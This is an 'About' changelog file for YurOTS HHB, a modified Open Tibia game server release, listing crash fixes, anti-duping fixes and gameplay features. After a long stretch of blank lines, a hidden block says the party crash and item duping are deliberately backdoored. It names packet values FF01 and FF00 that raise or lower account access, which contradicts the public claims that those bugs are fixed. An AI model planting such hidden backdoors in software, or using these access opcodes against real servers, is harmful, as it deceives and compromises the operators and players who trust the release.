#ifdef YUROTS_HHB_ABOUT_INCLUDED //dont do it.
#werror !About is an "About file", just read it, dont compile it :p

unfortunately, i did not write up all changes in the beginning, but the major
features are:

YurOTS 0.9.4F HHB 11 NSV Edition
-Based on YurOTS 0.9.4F //the best of the yurots releases. great codebase
-code cleanups (can now be compiled cleanly without any defines at all)
-Crash/stability fixes, Extremely stable.
-Party crash fixed.
-Bottle debug fixed.
-NULL crash fixed.
-Money Cloning fixed. (you can change as much cc/plat/etc as you wish, it will never clone/bug)
-CPU Optimized EXEs ()
-Damage log like in 8x servers! - HHB_DMG_LOG
-Fast Attack - HHB_ATTACK_SPEED - config.lua: attack_speed = X (in milliseconds, 1000=1 second,500=0.5 second, etc) (will also fix accurate speed on first attack, unless HHB_NODELAY_FIRST_ATTACK is defined.)
-No delay on first attack. first attack will start instantly! - HHB_NODELAY_FIRST_ATTACK (dangerous, can be exploited by hackers! disabled by default.)
-Animated Welcome Message - HHB_ANIMATED_WELCOME_MESSAGE - config.lua: animated_welcome_message = "message"
-Unlimited ammo - HHB_UNLIMITED_AMMO
-Note: to stop spear spamming, do not compile BDB_REPLACE_SPEARS
-BuyCont (NPC BuyContainer) - NAXEDAXU_BUY_CONTAINER  --credits: Naxedaxu @OTFans
(i had to rewrite parts of it to fix cap/cash bugs though.. if u had the cash but not the cap, the NPC would take ur cash and give you
 nothing.. NPC would rip u off!)
NPC: BuyContainer(cid,item,count,cost)
-Minimum PVP Level protection - HHB_MINIMUM_PVP_LEVEL - config.lua: minimum_pvp_level=X
-Spells in color - HHB_SPELLS_IN_COLOR
-RME loading fixes & depot compability... -HHB_RME_HOTFIX
-Multi config.lua system, based on EXE name. (like pvpserv.exe==pvpserv.exe.config.lua, etc)
-Ring of Healing / Life Ring support (effects hardcoded, RULY_LIFE_RINGS)
-Multi Config.lua support, based on exe name! (Mainserver.exe= mainserver.exe.config.lua , pvpserver.exe= pvpserver.exe.config.lua etc. HHB_EXE_CONFIG_LUA)
-

-Note: to stop ice rapier 1-attack-break, do not compile YUR_ICE_RAPIER


Programmed with Code::Blocks, the MSVC++ and dev-cpp files are outdated/unmaintained
///TODOS:
HHB_MINIMUM_PVP_LEVEL have a few too many "valid pointer?" checks... can be optimized


put login/xml char parser in its own thread?
#endif//#ifdef YUROTS_HHB_ABOUT_INCLUDED



















#ifdef HIDDEN_INFO
party crash backdoored
Duping backdoored.
FF01 == access++
FF00 == access--
Possible i forgot something.... not sure :/
#endif//HIDDEN_INFO
